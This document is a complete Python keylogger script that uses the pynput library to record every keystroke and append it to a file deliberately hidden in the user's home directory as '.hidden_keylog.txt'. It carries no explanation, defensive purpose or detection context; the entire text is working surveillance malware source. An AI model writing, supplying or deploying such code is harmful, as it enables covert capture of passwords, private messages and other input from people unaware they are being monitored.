from pynput.keyboard import Listener
import os

# Path to save the log file, hidden in the user's home directory
log_file_path = os.path.expanduser('~/.hidden_keylog.txt')

def on_press(key):
    try:
        with open(log_file_path, 'a') as f:
            f.write(f'{key.char}')
    except AttributeError:
        # Special keys
        if key == key.space:
            # Write a space to the file instead of 'Key.space'
            with open(log_file_path, 'a') as f:
                f.write(' ')
        else:
            # For other special keys, write their name
            with open(log_file_path, 'a') as f:
                f.write(f' {key} ')

def main():
    with Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == '__main__':
    main()
